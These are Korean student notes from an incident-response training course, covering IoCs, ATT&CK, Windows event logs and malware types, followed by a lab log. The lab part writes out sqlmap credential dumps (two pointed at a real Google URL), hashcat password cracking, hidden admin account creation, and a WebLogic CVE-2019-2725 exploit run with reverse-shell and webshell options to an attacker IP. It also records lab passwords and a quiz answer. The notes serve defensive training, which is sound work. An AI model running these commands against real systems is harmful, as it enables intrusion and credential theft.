# 1. 침해사고 대응 준비 #

## 1.1 Warm Up ##

랜섬웨어 감염된 피시에는 **랜섬노트**가 있음 랜섬노트를 통해 비트코인을 요구하거나 함 랜섬노트가 생성된 날짜가 랜섬웨어에 감염된 시간과 같음

사용자가 직접 무언가를 다운받아서 하기는 힘듦 하지만 브라우저의 취약점을 통해서 자동으로 다운받고 실행시켜서 감염시키는 건 비교적 쉬움

랜섬웨어 감염 경로로는 이메일, 웹, USB 등이 있음


**\* BadUSB**
악성 소프트웨어가 프로그래밍된 USB 장치를 이용한 컴퓨터 보안 공격으로 BadUSB는 꽂기만 하면 바로 감염시킬 수 있음
[[https://en.wikipedia.org/wiki/BadUSB|참고자료]]


DMZ 존: 외부에서 내부로 접속할 수 있는 시스템들이 위치한 곳, 외부 서비스들, 대표 페이지, 메일 서버, 

공격자가 DMZ로 들어가서 감염을 통해

- 피버팅: 다른 존으로 이동하는 것
- 레터럴 무브먼트: 같은 존 안에서 다른 시스템으로 이동하는 것



C:\Windows\System32\drivers\etc\hosts
: 호스트 이름(도메인) IP 주소에 매핑하는 텍스트 파일로 DNS보다 우선하여 작동하며, 특정 사이트 차단, 개발 환경 도메인 설정, 또는 악성코드 감염 여부를 확인하는데 주로 사용



lastb: 리눅스 명령어로 로그인 실패한 기록을 확인하는 명령어로 정상적인 사용자들은 로그인이 실패하는 경우가 잦지 않으니까 lastb를 통해서 공격 여부를 확인할 수 있음
lastb에서 같은 시간내에 잦은 로그인 실패를 통해 공격으로 판단할 수 있음


#### HYDRA TOOL ####
네트워크 로그인 크래커로, 간단하게 수많은 비밀번호 후보를 순식간에 자동으로 대입해보고 맞는 것을 찾아내는 도구임 (불법적으로 쓰면 안 됨)

점검 도구가 있고, 해킹 도구가 있음 (**중국 툴을 쓰면 안 됨**)
점검 툴은 공식 페이지를 보유한 경우가 많고, 흔적을 남김(ex. 로그에 툴 이름을 남김), 점검 대상의 페이지에서 허용을 눌러야함



#### 웹 로그를 통한 공격흔적 확인 ####
- 정상 사용자들이 사용하는 요청은 거의 GET과 POST임, 따라서 웹 로그에 이것들 외의 요청이 들어오면 침해공격 여부를 고려해볼 수 있음
- PUT은 서버측에 자원을 **생성**하는 것이기 때문에 잘 안 쓰이기 때문에 공격일 확률일 높음
- GET 요청 등을 통해서 들어온 변수의 이름이 cmd 같은 것이라면 의심해볼만함



#### \*\* 사고대응체계 및 방법론 ####
- 신속한 사고 대응을 위한 절차 및 방법론 파악
	- 침해사고 발생 시 신속하게 데이터를 수집하기 위해서는 사전에 수립된 조직적인 절차가 필요함
	- 절차 수립 시 아래의 공신력 있는 기관의 절차를 참조할 수 있음
		- ex1) NIST: 컴퓨터 보안사고 핸들링 가이드(4단계)
		- ex3) 한국인터넷진흥원(KISA): 침해사고 분석 절차(7단계), 민간분야 침해사고 대응 가이드
- **침해사고 대응은 재발 방지를 위해 하는 것**



#### \*\* 침해지표(IoC) ####
- 특정 침해사고의 증거 및 흔적들을 의미하는 데이터
	- 본래 디지털 포렌식 및 사고대응 분야에 사용되었으나 현재 보안장비/솔루션에서도 침해사고 이력을 확인하는 용도로 점차 확장되어 쓰이고 있음
	- 공격에 활용된 인프라...



#### TTPs ####
- 등장 배경
	- **IoC 기반의 방어 체계도**, 매우 유용하게 사용되고 있으나 한계가 존재



#### \*\* MITER ATT&CK ####
- Matrix for Enterprise (23/10/31)
	- 전략(Tactics): 14개
	- 기술(Techniques): 201개



- #### 휘발성/비휘발성 데이터 ####
	- 각종 위협의 원리
		- 컴퓨터 시스템은 크게 CPU, 메모리, 디스크의 구조로 이루어짐
		- 침해사고가 발생하면 공격자의 각종 흔적이 메모리 혹은 디스크에 존재
			- ex. 데이터 수집 시 휘발성의 민감도가 높은 데이터부터 수집(메모리 -> 디스크)
- #### 공격자/사용자의 행위 ####
	- 사용자의 정상 행위로 인해 발생하는 흔적
		- 침해사고가 발생하지 않은 평시에도 시스템 내에서는 흔적이 남음
		- 정상적인 상태에서 사용자의 행위들로 인해 발생하는 정상 이벤트들에 대한 숙지 필요
	- 공격자의 비정상 행위로 인해 발생하는 흔적
		- 침해사고가 발생한 경우 시스템 내의 흔적 및 로그들은 일반적으로 방대한 편
		- 비정상 행위로 인해 발생하는 흔적을 숙지한 경우, 방대한 데이터 속에서 해당 흔적을 찾기가 용이함



#### 이벤트 확인 ####
1)  Win + R -> secpol.msc(로컬 보안 정책) -> 로컬 정책 -> 감사 정책 -> 모든 정책을 다 보안 설정에서 성공, 실패를 설정
	- 이 과정을 통해서 이벤트가 기록됨
2)  Win + R -> eventvwr.msc(이벤트 뷰어) => 이벤트를 확인하는 뷰어
3)  cmd 창으로 윈도우 계정 추가
	- net user: 윈도우의 계정들을 나타냄
	- net user bts /add
	- net user iu$ /add (\* Windows에서 $ 기호는 히든을 뜻함)
	- net localgroup administrators iu$ /add
4) 구글에 windows event id 검색 -> [[https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/|윈도우 이벤트 아이디 리스트]]에서 event id들 확인
5) 4720, 4732 이벤트 아이디로 이벤트 뷰어에서 필터링해서 추가한 계정들을 확인

![[Pasted image 20260219111949.png]]



- #### \*\* 침해사고의 주된 원인, 위협 원리 이해 ####
	- 각종 위협의 원리
		- 정보자산을 위협하는 공격자들의 전략과 기술, 절차들의 이해 필요
			- ex. 외부 -> 내부 침투 시 활용하는 공격 기법, 침투 후 권한 상승에 활용하는 기법 등 
		- 공격 기술의 원리와 공격자가 가진 목적을 프로파일링 할 수 있는 역량 필요
			- ex. 내가 공격자였다면? -> 지속성 유지를 원했을 것 같음 -> 자동실행 등록 흔적 확인
- #### IT 인프라 이해 ####
	- 인프라의 구성요소 파악
		- 침해 환경의 IT 인프라를 파악할 수 있다면 공격자의 행위를 유추하고 데이터를 빠르게 수집 가능
			- ex1. 외부 -> 내부로 침투 가능한 포인트를 빠르게 확인
			- ex2. DB 유출 -> DB 서버에 접근 권한을 가진 내부 PC 혹은 계정 확인



- #### \*\* 데이터/아티팩트 수집 및 분석을 위한 지식 ####
	- 침해사고 발생 시 수집 및 분석할 수 있는 **데이터와 아티팩트의 종류**
		- 아티팩트: 사용자의 개입 없이도 데이터를 처리하는 과정에서 자동으로 생성되는 흔적
		- 침해환경의 운영체제가 가지고 있는 아티팩트의 종류를 숙지하면 수집/분석 과정에 활용 가능
			- ex. 파일 시스템, 웹 방문기록, 이벤트로그, 프리패치, 임시파일, 휴지통 등
- #### \*\* 침해사고대응 도구 ####
	- 데이터 수집/분석에 활용할 수 있는 도구의 종류
		- 모든 도구의 사용법을 숙지하기는 어려우나 특정 아티팩트 및 데이터를 분석하는데 특화된 도구가 존재




- #### 침해사고 대응 ####
	- '침해사고'의 정의
		- 정보통신망이용촉진 및 정보보호 등에 관한 법률 제 2조 1항 7조



## 1.2 침해사고의 주요 원인 ##

- #### 침해사고의 특징 ####
	- 불특정 다수를 대상으로 다양한 조직자산을 대규모로 공격 수행
	- 은밀하게 다수의 좀비 PC를 생성하고 목표를 가지고 집중공격 수행
	- 손쉽게 해킹기법과 방법의 대중화로 인한 침해사고의 대중화
	- 정치적, 금전적인 목적을 가지고 조직적인 침해사고 발생



- #### 침해사고 유형 ####
	- ##### 기밀성 #####
		- 허용된 사람에게 허용된 정보만을 제공하는 것을 의미
		- 고객 정보 유출 및 기밀 정보 유출
			- 비인가 시스템에 접근하여 네트워크를 통해 정보 유출
			- 인가 시스템에 접근하여 정보 유출
			- 저장 매체 분식, 민감정보를 포함하는 하드디스크나 프린트된 정보 관리 실패
			- 악성코드 활동에 의한 유출 등
		  
	- ##### 무결성 #####
		- 인가된 사용자만 정보를 변경한 경우할 수 있음
		- 변조 공격
			- 비인가자가 내부 데이터를 변조한 경우
			- 정상적인 서비스르 ㄹ변조하여 잠재적 피해를 입힌 경우
			- 기밀성 정보의 의도적으로 조작한 경우 등
		  
	- ##### 가용성 #####
		- 서비스 운영에 지장이 없는 요소로 사용자가 원하는 시간에 서비스를 이용할 수 있는가를 의미함
		- 서비스 중단
			- 서비스 응용프로그램 버그로 인해 서비스가 중단되는 경우 - DoS 공격
			- 서비스 응용프로그램이 대량의 요청을 소화하기에 시스템 리소스가 부족한 경우 DDoS 공격
			- 악성코드가 시스템을 파괴시키는 경우
			- 물리적 손상이 발생하여 서비스가 중단된 경우 등


...


- #### 악성코드 소유형 ####
	- 접근 & 강탈
		- RAT
		- 
	- 접근 & 강탈
		- RAT
			- 원격접속 트로이목마(Remote Acess Trojan)의 약어로 일반적인 원격 접속 도구들(TeamViewer, RDP 등)과 다르게 정보 탈취, PC 모니터링 등의 악의적인 목적으로 사용되는 악성코드
			- 피해자의 PC에서 실행될 경우 내부의 RAT 악성코드가 실행되어 공격자가 해당 PC에 접근 가능
		- Backdoor
			- 사용자가 몰래 접근할 수 있는 기능
			- ex. WebShell, Reverse Connection 자동실행 등
		- Banker
			- 금융 거래를 가로채거나 금융 정보를 수집하는 기능
		- GameThief
			- 게임 로그인 계정을 수집하는 기능
	- 추가 다운로드 방식
		- Dropper
			- 악성코드 내에 악성코드가 포함되어 인터넷 없이 새로운 악성코드를 실행하는 기능
		- Downloader
			- ...

























VMware Workstation -> Edit -> Virtual Network Editor -> Restore Defaults로 최초 설치 상태의 VMware로 복원 ->
Nat의 Subnet IP를 192.168.0.0으로 설정
![[Pasted image 20260219141234.png]]

Attacker 먼저 접속, 새창으로 Victim1 접속
Attacker
Kali Linux 2019
root/toor

192.168.0.150-Wordpress
kisec123


각 가상환경에서 ifconfig로 ip값 확인
설정 -> System Settings -> Wire -> 옵션 -> 

![[Pasted image 20260219143347.png]]

cd /etc/apache2/sites-enabled/
ls
gedit wordpress.conf
![[Pasted image 20260219144056.png]]

- DocumentRoot - 
- CustomLog - 



KISA -> 가이드라인 -> 스마트공장 사이버보안 가이드, 주요정보통신기반시설 기술적 취약점 분석·평가 방법 상세가이드



mysql 로그인 정보
kisec123
toor

show databases;

Burp -> Proxy -> 
http://192.168.0.150/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php


https://beacons.gcp.gvt2.com/domainreliability/upload

{"entries":[{"failure_data":{"custom_error":"net::ERR_ABORTED"},"http_response_code":200,"network_changed":false,"protocol":"SPDY","request_age_ms":74685,"request_elapsed_ms":2955,"sample_rate":1.0,"server_ip":"","status":"aborted","url":"https://beacons.gcp.gvt2.com/domainreliability/upload","was_proxied":true},{"failure_data":{"custom_error":"net::ERR_ABORTED"},"http_response_code":200,"network_changed":false,"protocol":"SPDY","request_age_ms":74685,"request_elapsed_ms":2957,"sample_rate":1.0,"server_ip":"","status":"aborted","url":"https://beacons.gcp.gvt2.com/domainreliability/upload","was_proxied":true}],"reporter":"chrome"}




sqlmap -u "https://beacons.gcp.gvt2.com/domainreliability/upload" --data "post_id=1&up_type=like" -p post_id --level=3 --dbs


sqlmap -u "https://beacons.gcp.gvt2.com/domainreliability/upload" --data "post_id=1&up_type=like" -p post_id --level=3 -D "wordpress" --tables


sqlmap -u "http://192.168.0.150/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php" --data "post_id=1&up_type=like" -p post_id --level=3 -D "wordpress" -T "wp_users" --columns 


sqlmap -u "http://192.168.0.150/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php" --data "post_id=1&up_type=like" -p post_id --level=3 -D "wordpress" -T "wp_users" -C "user_email,user_login,user_pass" --dump




| user_email          | varchar(100)        |
| user_login          | varchar(60)         |
| user_nicename       | varchar(50)         |
| user_pass           | varchar(255)  

Kali의 CMD에서 hash-identifier를 입력하고 HASH값을 입력하면
Possible Hashs:
\[+] MD5(Wordpress) 
위와 같은 문장이 출력됨 

![[Pasted image 20260219162015.png]]

cd /usr/share/crunch/
위 경로에 charset.lst 가 있음

crunch 1 5 -f /usr/share/crunch/charset.lst lalpha -o ~/wordlist.txt 
-> 최소 1~5자리의 소문자로 되어있는 소문자들이 wordlist.txt에 적혀있음
a
...
...
...
zzzzz
위와 같은 느낌으로 되어 있음

\$P$Bj3HUdZkyn707J1mMcl55iUcMCCwaO. 

hashcat -a 0 -d 1 -m 400 -o crack.txt pass.txst wordlist.txt
-> hashcat을 연 경로에서 crack.txt를 열면
\$P$Bj3HUdZkyn707J1mMcl55iUcMCCwaO.:kisec 와 같은 내용이 나오고 kisec이 비밀번호임

kisec의
admin/kisec




명령어 dirbuster 입력하면 디렉토리 구조를 파악할 수 있는 directory buster GUI가 표시됨

target URL: http:\//192.168.0.150
사전 파일 경로: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt









Wordpress
sudo mysql -u root -p -> sql 접속
비밀번호: kisec1234
toor

use wordpress
select * from wp_options where option_name="siteurl" or option_name="home"; -> wp_options에서 option_name이 siteurl 이나 home 인 데이터를 검색



UPDATE wp_options set option_value = "http://192.168.0.128" WHERE option_name = "siteurl" or option_name = "home";


### power shell에서 가상머신에 붙어서 좀 더 빠르게 동작하기 위한 방법!! ###

- 가상머신의 터미널에서 작성
	1. sudo apt-get update
	2. sudo apt-get install openssh-server
	3. netstat -ano |grep ":22" 로 22번 포트가 열려있는지 확인
- 윈도우의 파워셸에서 작성
	1. ssh (붙을 컴퓨터 이름, whoami 값)@(붙을 컴퓨터 IP)
	2. kisec1234
	3. sudo apt-get upgrade, sudo apt-get update


C:\Users\WINS_24\Desktop\침해사고 대응 자료\02-20\CASTLE_2017\프로그램\castlephp
를 가상머신의 /var/www/html/wordpress 에 넣어야함

어캐어캐 옮겨서 /var/www/html/wordpress/castlephp 이런 경로가 만들어져야함
여기까지 하고나면 CASTLE 사전 설치 준비가 완료됨




아이디: CastleIsFun
비밀번호: NoCastleIsNotFun





docker run -d --user root --name weblogic_12.1.3 -p 7001:7001 -p 7002:7002 kisec/weblogic12



http:\//192.168.0.150:7001/consol

(weblogic/welcome1)







nc -lvp 12345
netcat -listening view port 12345

python3 KISEC-CVE-2019-2725-ExploitKit.py http://192.168.0.150:7001 reverse_shell --attackerIp 192.168.0.130 --attackerPort 53


python3 KISEC-CVE-2019-2725-ExploitKit.py http://192.168.0.150:7001 webshell --weblogicVer 12.1.3





문제는 C->B->A 순서로 풀어보기

이벤트예약 웹사이트를 운영하고 있는 "깜짝이야"사의 관리자 앞으로 한 통의 협박 메일이 도착했다.
당장 10억을 입금하지 않으면, 확보한 자사의 웹페이지 소스코드를 모두 공개할 것이며,
추가적인 위협을 가하겠다는 내용이다.
관리자는 포렌직 전문가인 당신에게 침해사고 분석을 의뢰하였다.
침해된 시스템에 남겨진 흔적과 각종 로그파일을 분석하여 다음 사항을 밝혀내시오.

A. 공격자가 웹페이지 소스코드를 유출한 시간(UTC+09:00)은 ? (yyyy-MM-dd_hh:mm:ss) 
access.log
B. 리버스쉘(Reverse Shell)을 동작시키는 프로세스 ID(PID)는 ? (10진수) 
pstree_a -> ps_eaf
C. 리버스쉘(Reverse Shell)에 대한 공격자 주소(IP)는 ? 
netstat_an

답 입력 : yyyy-MM-dd_hh:mm:ss_5248_144.206.162.21











## 1.3 사고대응체계 수립 ##








## 1.4 추가 고려사항 ##













---
# 2. 침해사고의 흔적들 #















---
# 3. 침해사고 흔적 수집 #















---
# 4. 침해사고 분석 실습 #

















































